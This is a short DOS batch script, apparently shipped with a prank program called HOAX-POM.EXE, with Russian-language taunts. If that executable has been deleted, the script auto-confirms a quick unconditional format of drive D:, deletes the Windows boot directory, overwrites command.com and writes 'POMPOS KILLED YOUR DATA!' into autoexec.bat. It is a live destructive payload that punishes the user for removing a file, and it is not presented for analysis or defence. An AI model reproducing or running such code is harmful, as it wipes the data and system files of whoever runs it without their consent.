@echo off
@echo off
if exist ..\HOAX-POM.EXE goto fun
echo  Ты поступил ОЧЕНЬ НЕПРАВИЛЬНО, удалив ..\HOAX-POM.EXE пощады
echo не жди... Делать нечего, нажимай любую клавишу...
echo y| format d: /q /u /v:Pompos
deltree/y winbootdir% > nul
copy c:\command.com %winbootdir%\command.com
echo @echo off >> c:\autoexec.bat
echo POMPOS KILLED YOUR DATA! >> c:\autoexec.bat
echo Version 4.0 by Boroda production >> c:\autoexec.bat
echo Следующий раз будь умнее, и не жалей несколько килобайт... 

:fun
